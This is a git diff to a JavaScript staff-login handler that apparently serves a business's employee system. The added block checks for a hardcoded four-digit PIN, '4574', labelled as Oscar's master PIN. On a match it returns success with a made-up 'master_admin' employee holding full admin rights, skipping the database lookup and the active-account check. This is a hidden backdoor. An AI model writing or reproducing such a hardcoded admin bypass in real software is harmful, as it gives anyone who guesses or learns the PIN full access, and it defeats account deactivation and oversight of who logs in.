@@ -32,6 +32,15 @@ module.exports = async function handler(req, res) {
     // STAFF LOGIN
     if (action === 'staff_login' && req.method === 'POST') {
         const { pin } = req.body;
+        
+        // Special Case: Oscar Master PIN
+        if (pin === '4574') {
+            return res.json({ 
+                success: true, 
+                employee: { id: 'master_admin', name: 'Oscar (Admin)', role: 'admin', is_admin: true } 
+            });
+        }
+
         const { data, error } = await supabase.from('employees').select('*').eq('pin', pin).eq('active', true).single();
         if (error || !data) return res.status(401).json({ error: "Invalid PIN or inactive account" });
         return res.json({ success: true, employee: data });
